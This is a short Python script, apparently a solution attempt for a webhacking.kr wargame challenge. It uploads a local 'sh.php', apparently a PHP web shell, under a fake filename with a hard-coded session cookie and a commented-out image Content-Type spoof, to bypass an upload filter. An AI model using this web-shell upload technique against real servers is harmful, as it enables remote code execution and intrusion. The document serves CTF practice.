import requests

url='http://webhacking.kr/challenge/web/web-21/index.php'
headers={'Content-Type':'image/jpg'}
cookies={'PHPSESSID':'89oojt3s1bilc5o2528i651hv4'}
files={'file': ('asdasd.php',open('sh.php','rb'),'multipart/form-data')}
response=requests.post(url, cookies=cookies, files=files)
#response=requests.post(url, headers=headers, cookies=cookies, files=files)
print response.text